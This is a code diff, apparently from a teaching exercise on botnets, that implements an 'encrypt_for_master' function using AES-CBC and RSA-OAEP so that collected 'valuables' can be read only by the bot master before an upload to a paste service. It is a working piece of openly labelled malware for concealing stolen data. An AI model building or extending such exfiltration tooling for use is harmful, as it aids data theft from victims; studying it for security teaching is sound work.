@@ -2,6 +2,9 @@ import os
 from Crypto.PublicKey import RSA
 from Crypto.Hash import SHA256
 from Crypto.Signature import PKCS1_PSS
+from Crypto.Cipher import AES
+from Crypto import Random
+from Crypto.Cipher import PKCS1_OAEP
 
 # Instead of storing files on disk,
 # we'll save them in memory for simplicity
@@ -14,9 +17,30 @@ valuables = []
 def save_valuable(data):
     valuables.append(data)
 
+"""
+    AES and RSA will be used for encryption, where AES with CBC mode will be used to encrypted
+    the actual data, and RSA will be used to be encrypt AES key. Final encrypted data will be
+    in the format of iv | encrypted AES key | encrypted actual data.
+"""
 def encrypt_for_master(data):
-    # Encrypt the file so it can only be read by the bot master
-    return data
+    # Define padding funtion for CBC mode
+    size_to_add = lambda s: AES.block_size - len(s) % AES.block_size
+    pad = lambda s: s + bytes((size_to_add(s)) * chr(size_to_add(s)), "ascii")
+    # Initialise AES cipher
+    aes_key = Random.new().read(32)
+    iv = Random.new().read(AES.block_size)
+    aes_cipher = AES.new(aes_key, AES.MODE_CBC, iv)
+    # Encrypt data
+    encrypted_data = aes_cipher.encrypt(pad(data))
+    # Read public key
+    key_file = open('publicKey.pem')
+    public_key = RSA.importKey(key_file.read())
+    key_file.close()
+    # Encrypt AES key with PKCS1 OAEP
+    rsa_cipher = PKCS1_OAEP.new(public_key)
+    encrypted_aes_key = rsa_cipher.encrypt(aes_key)
+    # Return concat of three components
+    return iv + encrypted_aes_key + encrypted_data
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
